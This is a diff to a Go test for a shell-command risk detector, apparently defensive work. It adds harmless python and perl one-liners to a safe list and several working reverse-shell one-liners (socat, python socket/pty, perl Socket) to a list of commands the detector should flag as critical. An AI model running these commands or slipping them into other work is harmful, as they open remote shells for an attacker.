@@ -221,6 +221,8 @@ func TestInspectShellRisk(t *testing.T) {
 		"nc host-example.org 80",
 		"nc -v app-client 443",
 		"netcat -w 5 dev-env 22",
+		"python3 -c 'print(\"hello\")'",
+		"perl -e 'print 42;'",
 	}
 	for _, cmd := range safeCmds {
 		risk := regulator.InspectShellRisk(workDir, cmd)
@@ -257,6 +259,10 @@ func TestInspectShellRisk(t *testing.T) {
 		"cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
 		"socat TCP4:10.0.0.1:4444 EXEC:/bin/sh",
 		"socat - TCP4:evil.com:1337 | /bin/bash",
+		"socat exec:'bash -li',pty,stderr tcp:10.0.0.1:4444",
+		"socat tcp-connect:10.0.0.1:4444 exec:/bin/sh,pty",
+		"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+		"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
 	}
 	for _, cmd := range criticalCmds {
 		risk := regulator.InspectShellRisk(workDir, cmd)
